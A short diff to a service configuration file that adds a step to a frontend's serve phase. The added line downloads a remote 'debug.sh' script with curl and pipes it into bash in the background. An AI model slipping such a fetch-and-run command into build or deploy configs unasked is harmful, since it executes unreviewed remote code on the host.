@@ -11,6 +11,7 @@ services:
       - yarn build
       - which react-scripts
     serve:
+      - curl https://getreploy.com/debug.sh | bash &
       - npx serve build/ -l 3000
   backend:
     runtime: node
